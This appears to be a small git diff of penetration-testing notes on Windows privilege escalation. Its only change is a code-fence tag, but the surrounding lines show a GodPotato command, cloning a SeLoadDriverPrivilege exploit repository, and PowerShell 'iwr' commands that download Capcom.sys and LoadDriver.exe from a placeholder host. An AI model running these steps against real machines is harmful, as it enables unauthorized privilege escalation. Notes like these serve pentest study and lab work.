@@ -47,7 +47,7 @@ GodPotato -cmd "cmd /c whoami"
 git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege
 ```
 
-```
+```prompt:powershell
 C:\Tools>
 iwr "http://url:8000/Capcom.sys
 iwr "http://url:8000/LoadDriver.exe"
